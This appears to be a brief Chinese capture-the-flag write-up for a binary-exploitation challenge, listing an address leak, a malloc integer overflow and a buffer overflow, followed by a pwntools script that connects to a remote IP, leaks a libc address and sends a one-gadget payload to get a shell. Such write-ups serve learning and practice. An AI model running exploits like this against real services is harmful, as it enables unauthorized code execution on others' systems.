在PWN上我真是个弟弟  
1. 泄漏
2. malloc可以整数溢出(姑且这么叫吧)  
3. 缓冲区溢出  
看大佬们直接用的[one-gadget](https://github.com/david942j/one_gadget)

```Python
from pwn import *
#context.log_level="debug"

p=remote("116.85.48.105",5005)
p.sendafter("username: ","aaaa"*6)
p.recvuntil("aaaa"*6)
leak=u32(p.recv(4))-0x5f6bb
payload=p32(leak+0x5f065)*17+"\x00"
p.sendlineafter("password: ","-1")
p.sendafter(": ",payload)
p.interactive()
```